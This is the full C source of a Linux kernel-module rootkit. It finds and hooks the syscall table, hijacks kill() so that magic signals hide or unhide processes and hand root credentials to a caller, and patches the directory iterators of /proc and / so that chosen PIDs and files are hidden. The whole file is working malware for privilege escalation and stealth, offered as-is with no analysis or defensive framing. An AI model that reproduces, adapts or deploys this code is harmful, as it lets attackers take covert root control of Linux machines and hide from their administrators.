#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/proc_ns.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/export.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("D4RKR05E");
MODULE_VERSION("0.1");

#define START_MEM       PAGE_OFFSET
#define END_MEM	        ULONG_MAX
#define SIGHIDE         4001
#define SIGUNHIDE       4002
#define SIGROOT         4003
#define _DEBUG_ENABLED  1
#define HIDE_NAME       "__asdasd737737"
/* asm_code_patch : movabs rax, addr; jmp rax */
#define asm_code_patch  "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define asm_code_len    12
#define asm_addr_offset 2

#if _DEBUG_ENABLED
# define debug(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define debug(fmt, ...)
#endif

static int (*proc_iterate)(struct file *file, struct dir_context *);
static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*dir_iterate)(struct file *file, struct dir_context *);
static int (*dir_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

struct list_head* saved_module;
void** table_syscall;
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
asmlinkage int (*o_kill) (pid_t pid, int sig);
asmlinkage int n_kill (pid_t pid, int sig);
module_init(rootkit_init);
module_exit(rootkit_exit);

struct hide_pid {
    int pid;
    struct list_head list;
};
LIST_HEAD(hide_pids);

struct code_hook {
    unsigned char old_code[asm_code_len];
    unsigned char new_code[asm_code_len];
    void* hooked_addr;
    struct list_head list;
};
LIST_HEAD(code_hooks);

struct asd {
    int n;
    struct list_head list;
};
LIST_HEAD(asds);

static inline void unprotect_mem(void) 
{
    preempt_disable();
    barrier();
    write_cr0(read_cr0() & (~0x10000));
}

static inline void protect_mem(void) 
{
    write_cr0(read_cr0() | 0x10000);
    barrier();
    preempt_enable();
}

int _atoi(const char *str)
{
    int res = 0; // Initialize result
    int i;
    // Iterate through all characters of input string and
    // update result
    for (i = 0; str[i] != '\0'; ++i)
        res = res*10 + str[i] - '0';
    // return result.
    return res;
}

void* fs_iterate(const char* dir) 
{
    struct file* pfile;
    void* ret = NULL;
    pfile = filp_open(dir, O_RDONLY, 0);
    if(pfile != NULL) {
	ret = pfile->f_op->iterate;
    }
    return ret;
}

void hexDump(char *desc, void *addr, int len)
{
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;

    // Output description if given.
    if (desc != NULL)
        printk ("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printk("  %s\n", buff);

            // Output the offset.
            printk("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printk(" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }

        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printk("   ");
        i++;
    }

    // And print the final ASCII bit.
    printk("  %s\n", buff);
}

struct code_hook* find_code_hook(void* addr) 
{
    struct code_hook* hook = NULL;
    list_for_each_entry(hook, &code_hooks, list) 
    {
        if(hook->hooked_addr == addr) 
            return hook;
    }
    return NULL;
}

static inline void _inject_code(struct code_hook* hook) 
{
    unprotect_mem();
    memcpy(hook->hooked_addr, hook->new_code, asm_code_len);
    protect_mem();

}

static inline void _uninject_code(struct code_hook* hook) 
{
    unprotect_mem();
    memcpy(hook->hooked_addr, hook->old_code, asm_code_len);
    protect_mem();
}

void inject_code_hook(void* addr, void* hook_addr) 
{
    struct code_hook* hook;
    debug("Hook %p to %p\n", addr, hook_addr);
    hook = kmalloc(sizeof(*hook), GFP_KERNEL);
    memcpy(hook->old_code, addr, asm_code_len);
    memcpy(hook->new_code, asm_code_patch, asm_code_len);
    *(unsigned long *)&hook->new_code[2] = (unsigned long)hook_addr;
    hook->hooked_addr = addr;

    hexDump("before", addr, asm_code_len);
    _inject_code(hook);
    hexDump("after", addr, asm_code_len);

    list_add(&hook->list, &code_hooks);
}

void stop_inject(void *addr) 
{
    struct code_hook* hook = find_code_hook(addr);
    if(hook != NULL)
	    _uninject_code(hook);
    return;
}

void lanjut_inject(void *addr) 
{
    struct code_hook* hook = find_code_hook(addr);
    if(hook != NULL)
	    _inject_code(hook);
}

static int n_proc_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) 
{
    struct hide_pid* hp;
    int pid;
    pid = _atoi(name);
    list_for_each_entry(hp, &hide_pids, list) 
    {
        if(hp->pid == pid)
            return 0;
        
    }
    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}

int n_proc_iterate(struct file* file, struct dir_context* ctx) 
{
    int ret;
    proc_filldir = ctx->actor;
    *((filldir_t *)&ctx->actor) = &n_proc_filldir;
    stop_inject(proc_iterate);
    ret = proc_iterate(file, ctx);
    lanjut_inject(proc_iterate);
    return ret;
}

void hack_proc(void) 
{
    proc_iterate = fs_iterate("/proc");
    inject_code_hook(proc_iterate, n_proc_iterate);
    return;
}

static int n_dir_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) 
{
    if(!strncmp(HIDE_NAME, name, sizeof(HIDE_NAME)-1)) 
    {
        debug("Hide!");
        return 0;
    }
    return dir_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}

int n_dir_iterate(struct file* file, struct dir_context* ctx) 
{
    int ret;
    dir_filldir = ctx->actor;
    *((filldir_t *)&ctx->actor) = &n_dir_filldir;
    stop_inject(dir_iterate);
    ret = dir_iterate(file, ctx);
    lanjut_inject(dir_iterate);
    return ret;
}

void hack_dir(void) 
{
    dir_iterate = fs_iterate("/");
    inject_code_hook(dir_iterate, n_dir_iterate);
    return;
}

unsigned long * get_syscall_table(void) 
{
    unsigned long *syscall_table;
    unsigned long int i;

    for (i = START_MEM; i < END_MEM; i += sizeof(void *)) 
    {
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}
asmlinkage int n_kill (pid_t pid, int sig)
 {
    struct hide_pid* sembunyi = NULL;
    if(sig == SIGHIDE) 
    {
        debug("Received command\n");
        sembunyi = kmalloc(sizeof(*sembunyi), GFP_KERNEL);
        sembunyi->pid = pid;
        list_add(&sembunyi->list, &hide_pids);
        return 1337;
    }
    if(sig == SIGUNHIDE) 
    {
        debug("unhide\n");
        list_for_each_entry(sembunyi, &hide_pids, list) 
        {
            if(sembunyi->pid == pid) 
            {
                list_del(&sembunyi->list);
                break;
            }
        }
    }
    if(sig == SIGROOT && pid == 31337)
        commit_creds(prepare_kernel_cred(0));
    
    if(sig == 4007)
        list_add(&__this_module.list, saved_module);
    
    return o_kill(pid, sig);
}

/**
 * Entrypoint rootkit
 * Fungsi ini akan dijalankan ketika module dimasukkan (insert) ke kernel.
 */
static int __init rootkit_init(void) 
{
    table_syscall = (void**) get_syscall_table();
    debug("Hello LKM\n");
    saved_module = __this_module.list.prev;
    unprotect_mem();
    o_kill = table_syscall[__NR_kill];
    table_syscall[__NR_kill] = n_kill;
    protect_mem();
    hack_proc();
    hack_dir();
    return 0;
}

/**
 * Cleanup
 * Fungsi ini akan dijalankan ketika module dikeluarkan (remove) dari kernel
 */
static void __exit rootkit_exit(void) 
{
    stop_inject(proc_iterate);
    stop_inject(dir_iterate);
    unprotect_mem();
    table_syscall[__NR_kill] = o_kill;
    protect_mem();
}
